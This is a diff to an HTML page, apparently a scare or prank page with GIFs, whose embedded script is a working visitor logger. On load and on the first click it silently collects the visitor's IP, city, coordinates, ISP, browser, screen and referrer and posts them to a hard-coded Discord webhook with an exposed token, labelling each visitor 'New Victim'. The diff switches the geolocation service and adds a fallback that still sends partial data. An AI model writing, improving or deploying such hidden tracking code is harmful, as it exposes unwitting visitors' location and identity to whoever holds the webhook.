@@ -51,25 +51,25 @@ body {
 <img class="float f" src="https://media.giphy.com/media/ICOgUNjpvO0PC/giphy.gif">
 
 <script>
-// === YOUR DISCORD WEBHOOK URL ===
+// === YOUR DISCORD WEBHOOK ===
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1492201181412593895/OsetCXRaeFK59ZMTZMHBR04_Zjw9aD19Qs_ne--tjdsYzJRjZru92DKJqYv-FZjlyOEz";
 
 async function sendLogger() {
     try {
-        // FIXED: Use HTTPS version of ip-api.com
-        const ipRes = await fetch("https://ip-api.com/json/?fields=status,message,query,country,regionName,city,zip,lat,lon,timezone,isp");
+        // Better & more reliable IP API (uses HTTPS + fallback)
+        const ipRes = await fetch("https://ipapi.co/json/");
         const ipData = await ipRes.json();
 
         const info = {
-            ip: ipData.query || "Unknown",
+            ip: ipData.ip || "Unknown",
             city: ipData.city || "Unknown",
-            region: ipData.regionName || "Unknown",
-            country: ipData.country || "Unknown",
-            postal: ipData.zip || "Unknown",
+            region: ipData.region || "Unknown",
+            country: ipData.country_name || "Unknown",
+            postal: ipData.postal || "Unknown",
             timezone: ipData.timezone || "Unknown",
-            lat: ipData.lat || "Unknown",
-            lon: ipData.lon || "Unknown",
-            isp: ipData.isp || "Unknown",
+            lat: ipData.latitude || "Unknown",
+            lon: ipData.longitude || "Unknown",
+            isp: ipData.org || ipData.asn || "Unknown",
             userAgent: navigator.userAgent,
             platform: navigator.platform,
             language: navigator.language,
@@ -103,23 +103,42 @@ async function sendLogger() {
             }]
         };
 
-        const response = await fetch(WEBHOOK_URL, {
+        await fetch(WEBHOOK_URL, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify(payload)
         });
 
-        if (response.ok) {
-            console.log("✅ Full logger sent to Discord successfully!");
-        } else {
-            console.log("Webhook failed with status:", response.status);
-        }
+        console.log("✅ Full logger sent successfully!");
     } catch (e) {
         console.log("❌ Logger error:", e.message);
+        
+        // Fallback: Send at least the basic info if IP lookup fails
+        const fallbackPayload = {
+            username: "Aaron Scary Logger",
+            embeds: [{
+                title: "New Victim (IP lookup failed)",
+                color: 0xff8800,
+                description: "Only basic info available",
+                fields: [
+                    { name: "User-Agent", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false },
+                    { name: "OS / Browser", value: navigator.platform, inline: true },
+                    { name: "Language", value: navigator.language, inline: true },
+                    { name: "Screen", value: `${screen.width}×${screen.height}`, inline: true },
+                    { name: "Referrer", value: document.referrer || "Direct", inline: false },
+                    { name: "Time", value: new Date().toLocaleString(), inline: false }
+                ]
+            }]
+        };
+        await fetch(WEBHOOK_URL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(fallbackPayload)
+        });
     }
 }
 
-// Trigger on load + click
+// Trigger on load and click
 window.addEventListener("load", sendLogger);
 document.addEventListener("click", sendLogger, { once: true });
 </script>
